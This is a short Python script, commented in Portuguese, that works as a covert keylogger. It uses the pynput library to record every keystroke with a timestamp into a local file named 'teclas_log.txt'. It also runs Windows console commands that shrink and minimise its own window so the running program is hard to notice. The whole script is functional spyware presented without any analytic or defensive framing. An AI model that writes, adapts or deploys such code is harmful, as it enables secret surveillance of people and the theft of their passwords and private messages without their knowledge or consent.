import os
import logging
from pynput.keyboard import Key, Listener

# Esconde o prompt (assumindo que está sendo executado no Windows)
os.system('mode con: cols=15 lines=1')
os.system('color 0F')
os.system("start /min")

# Configura o log para salvar as teclas pressionadas em "teclas_log.txt"
logging.basicConfig(filename=("teclas_log.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
